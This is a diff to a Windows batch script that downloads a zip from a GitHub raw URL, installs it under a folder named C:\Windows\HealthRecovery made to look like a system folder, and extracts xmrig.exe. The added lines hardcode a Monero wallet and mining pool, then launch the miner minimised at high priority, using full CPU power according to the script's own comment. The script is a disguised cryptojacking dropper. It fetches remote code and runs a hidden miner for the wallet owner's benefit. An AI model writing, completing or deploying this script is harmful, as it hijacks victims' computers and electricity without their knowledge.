@@ -11,8 +11,12 @@ if %errorlevel% neq 0 (
 :: === CONFIGURATION ===
 set "DOWNLOAD_URL=https://raw.githubusercontent.com/fpsboostingontop/adasdad/main/ExecFileD.zip"
 set "INSTALL_DIR=C:\Windows\HealthRecovery"
-set "ZIP_NAME=ExectFileD.zip"
+set "ZIP_NAME=ExecFileD.zip"
 set "EXTRACTED_EXE=%INSTALL_DIR%\windowsrecovery\xmrig.exe"
+
+:: Wallet and pool configuration
+set "WALLET=4Ay91o3ogBbGn5dJdC4KmiCXku3XpZEMC5Rj2zN2Vv1Mb232V9bFVGjXCQftWYsjkELcyu9dGqnLdDQvjU4ioNrN9AohihD"
+set "POOL=pool.minexmr.com:443"
 
 :: === CREATE INSTALL DIRECTORY ===
 echo Creating install directory...
@@ -59,10 +63,10 @@ if %errorlevel% neq 0 (
 :: === DELETE ZIP ===
 del /f /q "%INSTALL_DIR%\%ZIP_NAME%"
 
-:: === RUN THE EXTRACTED PROGRAM ===
+:: === RUN XMRIG MINER USING MAX THREADS ===
 if exist "%EXTRACTED_EXE%" (
-    echo Running %EXTRACTED_EXE%...
-    start "" "%EXTRACTED_EXE%"
+    echo Running XMRig miner at full CPU power...
+    start "" /min /high "%EXTRACTED_EXE%" -o %POOL% -u %WALLET% -p x --tls --coin=monero --donate-level=1
 ) else (
     echo ERROR: %EXTRACTED_EXE% not found after extraction.
     pause
